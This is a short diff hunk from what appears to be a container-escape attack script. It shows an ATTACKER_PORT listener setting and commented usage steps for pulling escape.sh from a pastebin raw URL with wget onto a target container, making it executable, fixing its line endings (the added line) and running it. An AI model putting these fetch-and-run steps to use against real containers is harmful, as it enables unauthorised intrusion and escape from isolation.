@@ -11,6 +11,7 @@ ATTACKER_PORT="4445"          # Replace with your listener port number
 # 3. From the target container, download the raw version using:
 #    wget <your-pastebin-raw-url> -O escape.sh
 #    chmod +x escape.sh
+#    sed -i 's/\r$//' escape.sh
 #    ./escape.sh
 # ============================================================
 
